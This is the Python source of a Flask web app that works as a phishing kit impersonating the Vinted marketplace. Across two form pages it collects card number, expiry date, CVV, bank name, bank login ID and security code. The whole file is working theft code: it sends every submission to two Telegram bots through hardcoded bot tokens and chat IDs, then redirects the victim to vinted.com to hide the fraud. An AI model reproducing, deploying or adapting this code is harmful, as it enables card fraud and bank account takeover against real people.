from flask import Flask, render_template, request, redirect, session, url_for
import requests
import os

app = Flask(__name__)
app.secret_key = 'change_this_secret_key'

# Bot 1
BOT_TOKEN_1 = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID_1 = "6297861735"

# Bot 2
BOT_TOKEN_2 = "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs"
CHAT_ID_2 = "7650873997"

def send_to_telegram(bot_token, chat_id, text):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text}
    response = requests.post(url, data=payload)
    response.raise_for_status()  # S'il y a une erreur, elle sera levée ici

@app.route('/')
def form_step1():
    return render_template('form1.html')

@app.route('/form2', methods=['POST'])
def form_step2():
    # Stocker les données de la première page dans la session
    session['amount'] = request.form['amount']
    session['card_number'] = request.form['card_number']
    session['expiry'] = request.form['expiry']
    session['cvv'] = request.form['cvv']
    return render_template('form2.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Données de la première page
    amount = session.get('amount')
    card_number = session.get('card_number')
    expiry = session.get('expiry')
    cvv = session.get('cvv')

    # Données de la deuxième page
    bank_name = request.form['bank_name']
    bank_id = request.form['bank_id']
    security_code = request.form['security_code']

    # Message à envoyer
    text = f"""📨 Nouvelle soumission vinted:
💰 Montant : {amount} €
💳 Carte : {card_number}
📅 Expiration : {expiry}
🔒 CVV : {cvv}
🏦 Banque : {bank_name}
🆔 Identifiant : {bank_id}
🔐 Code de sécurité : {security_code}
"""

    try:
        # Envoi aux deux bots
        send_to_telegram(BOT_TOKEN_1, CHAT_ID_1, text)
        send_to_telegram(BOT_TOKEN_2, CHAT_ID_2, text)
    except requests.exceptions.RequestException as e:
        return f"Erreur d’envoi : {e}", 500

    return redirect("https://www.vinted.com")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
